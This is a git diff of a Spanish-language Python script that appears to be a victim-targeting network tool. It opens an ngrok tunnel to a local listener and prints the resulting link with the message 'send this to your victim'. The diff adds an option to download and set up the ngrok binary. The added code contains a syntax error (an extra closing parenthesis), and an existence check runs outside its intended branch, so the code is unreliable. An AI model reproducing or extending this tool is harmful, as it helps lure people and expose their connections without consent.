@@ -2,6 +2,7 @@ import socket
 import time
 import subprocess
 import os
+import sys
 def ip():
 
     HOST, PORT = str(input("host: ")), int(input("port: "))
@@ -35,15 +36,28 @@ def ip():
 
     01)Ngrok
     02)Local
+    03)Descargar Ngrok
     : """))
 
     if seleccion == "01" or seleccion == "1":
+        
         os.system("./ngrok http {0}:{1} > /dev/null &".format(HOST, PORT))
         time.sleep(10)
         print("Envia esto a tu victima: ")
         print(str(os.system("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o https://[0-9a-z]*\.ngrok.io\n")))
     if seleccion == "02" or seleccion == "2":
         print("Envia esto a tu victima:{0}:{1}\n".format(HOST, PORT))
+    if seleccion == "03" or seleccion == "3":
+        print("\nespera un minuto, esto puede tardar debido a tu conexion\n")
+        os.system("wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1")
+        os.system("unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1")
+        os.system("rm -rf ngrok-stable-linux-arm.zip")
+    if os.path.exists("ngrok"):
+        os.system("chmod +x ngrok")
+        print("se ha descargado con exito!\nvuelve a entrar")
+        sys.exit())
+        
+
 
         
     while True:
